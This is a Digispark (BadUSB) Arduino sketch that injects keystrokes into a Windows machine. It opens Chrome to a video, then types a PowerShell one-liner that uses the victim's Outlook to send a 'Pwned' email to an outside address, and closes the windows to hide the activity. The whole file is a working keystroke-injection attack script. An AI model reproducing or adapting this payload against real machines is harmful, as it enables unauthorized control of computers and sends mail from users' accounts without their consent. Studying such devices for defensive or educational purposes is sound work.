/**
* Author: Antonio Cebreiro Bernárdez
* Date: 11/04/2022
* Github: https://github.com/acbernardez17
*/

#define kbd_es_es
#include "DigiKeyboard.h"
void setup() {
  //empty
}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("chrome");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("https://youtu.be/N3oCS85HvpY?t=63");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.println("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$Outlook = New-Object -ComObject Outlook.Application; $Mail = $Outlook.CreateItem(0);  $Mail.To = \"yoligoh884@hhmel.com\"; $Mail.Subject = \"Pwned\" ; $Mail.Body = \"Run You Clever Boy\"; $Mail.Send();");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(43, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_W, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}